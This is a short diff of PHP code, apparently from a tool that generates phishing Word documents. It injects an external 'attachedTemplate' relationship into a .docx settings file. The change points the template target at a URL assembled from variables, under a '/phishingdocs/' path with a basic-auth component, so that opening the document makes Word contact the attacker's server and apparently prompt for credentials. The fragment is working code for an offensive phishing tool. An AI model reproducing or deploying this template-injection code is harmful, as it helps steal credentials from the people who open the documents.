@@ -375,7 +375,7 @@ $posrels = strpos($settingsxmlrels, "</Relationships>");
 $beforerels = substr($settingsxmlrels, 0, $posrels);
 
 $settingsrelspayload = "<Relationship Id=\"rId9999\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\"
-                        Target=\"URLVALUE/phishingdocs/REPLACEME\"
+                        Target=\"".$URL."/phishingdocs/".$basicauthurl."\"
                         TargetMode=\"External\"/>";
 
 $settingsrelsfile = "/var/www/uploads/word/_rels/settings.xml.rels";
